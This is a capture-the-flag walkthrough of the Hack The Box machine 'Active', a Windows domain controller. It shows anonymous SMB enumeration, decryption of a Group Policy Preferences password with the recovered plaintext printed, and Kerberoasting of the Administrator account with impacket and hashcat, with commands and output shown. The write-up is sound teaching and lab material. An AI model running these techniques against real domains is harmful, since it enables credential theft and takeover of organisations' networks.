# HTB Active

**Target:** `10.129.8.52`  
**Domain:** `active.htb`  
**Operating System:** Windows Server 2008 R2 SP1  
**Difficulty:** Easy  
**Attack Path:** SMB Enumeration → Group Policy Preferences (GPP) Password Disclosure → Service Account Access → Kerberoasting → Administrator Password Recovery

---

## 1. Port Scanning and Enumeration

Start with an Nmap scan to identify open ports, running services, and the target's likely role.


```
nmap -sC -sV 10.129.8.52 --min-rate 1000
```

### Important findings

|Port|Service|Significance|
|---|---|---|
|53|DNS|Domain name resolution|
|88|Kerberos|Active Directory authentication|
|135|MSRPC|Windows RPC services|
|139, 445|NetBIOS/SMB|File shares and domain resources|
|389|LDAP|Active Directory directory queries|
|464|Kerberos password service|Password change operations|
|3268|Global Catalog|Forest-wide directory queries|

The LDAP service identifies the domain as `active.htb`, and the server hostname is `DC`. The combination of DNS, Kerberos, LDAP, and SMB strongly suggests that this machine is an Active Directory domain controller.

SMB signing is enabled and required. This is useful to record, although it does not prevent the credential-disclosure and Kerberoasting techniques used in this attack.

## 2. Enumerating SMB Shares

Attempt anonymous share enumeration:

```
smbclient -N -L '//10.129.8.52/'
```

The server permits anonymous authentication and reveals these shares:

```
Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
IPC$            IPC
NETLOGON        Disk
Replication     Disk
SYSVOL          Disk
Users           Disk
```

The `Replication` share is particularly interesting because it may contain replicated domain files or configuration data. `SYSVOL` is also important because domain controllers store Group Policy objects and logon scripts there.

### Inspect the Replication share

Connect without credentials:

```
smbclient -N '//10.129.8.52/Replication'
```

Enumerate the directory structure and navigate to:

```
active.htb/Policies/
```

Inside a Group Policy object's directory, inspect:

```
{31B2F340-016D-11D2-945F-00C04FB984F9}/
    MACHINE/
        Preferences/
            Groups/
                Groups.xml
```

The GUID shown here is the default domain policy's well-known GUID.

Retrieve the file:

```
get Groups.xml
```

## 3. Extracting the GPP Password

Inspect the downloaded XML:

```
cat Groups.xml
```

The relevant entry contains:

```
<User name="active.htb\SVC_TGS" ...>
    <Properties
        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
        userName="active.htb\SVC_TGS"/>
</User>
```

The `cpassword` attribute contains an encrypted password associated with a Group Policy Preferences account configuration.

Historically, Group Policy Preferences could store passwords encrypted with a publicly documented AES key. Microsoft later addressed this insecure design, but old XML files can remain readable if they have not been removed.

### Decrypt the password

Use Impacket's `gpp-decrypt` utility:

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

Output:

```
GPPstillStandingStrong2k18
```

We now have credentials for:

```
Username: active.htb\SVC_TGS
Password: GPPstillStandingStrong2k18
```

**Key lesson:** This is not a password-cracking attack. The weakness is recoverable password storage in Group Policy Preferences.

## 4. Accessing the Users Share

Authenticate to the `Users` share using the recovered credentials:

```
smbclient '//10.129.8.52/Users' --user active.htb/svc_tgs
```

Enter the recovered password when prompted.

List the share contents:

```
ls
```

The listing includes directories such as:

```
Administrator/
All Users/
Default/
Default User/
Public/
SVC_TGS/
```

Navigate to the service account's Desktop:

```
cd SVC_TGS
cd Desktop
ls
```

Download the user flag:

```
get user.txt
```

This confirms that the recovered service-account credentials provide access to the share and allow retrieval of the user flag.

**Important distinction:** Access to a share and possession of a user's Windows logon session are not necessarily the same thing. SMB share permissions determine which files can be accessed; they do not automatically establish interactive access to the host.

## 5. Enumerating Kerberoastable Accounts

With valid domain credentials, enumerate accounts with Service Principal Names (SPNs) and request their service tickets:

```
impacket-GetUserSPNs active.htb/svc_tgs -request

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-10-22 11:28:56.155407             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$<RDACTED>
```

The account is also listed as a member of `Group Policy Creator Owners`.

### Why is this interesting?

Kerberos uses Service Principal Names to associate services with accounts. A domain user with sufficient permissions can request a ticket for an SPN without knowing the target account's password.

When the service runs under a user account, the returned TGS ticket contains encrypted data derived from that account's secret. An attacker can save the ticket and attempt to crack it offline.

In this case, the SPN belongs to `Administrator`, making the ticket especially valuable.

## 6. Cracking the Administrator's Kerberos Ticket

Run Hashcat against the RockYou wordlist:

```
└─$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================


Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$<REDACTED>:<PASSWORD>
```

This demonstrates **Kerberoasting**: requesting a service ticket using valid domain credentials and attempting to recover the service account's password offline.

The attack is possible because the ticket can be requested legitimately, while password guesses are tested locally rather than sent repeatedly to the domain controller.

## 7. Authenticate as Administrator

Test the recovered credentials against the SMB Users share:
```
smbclient '//10.129.8.52/Users' --user active.htb/Administrator

Try "help" to get a list of possible commands.
```
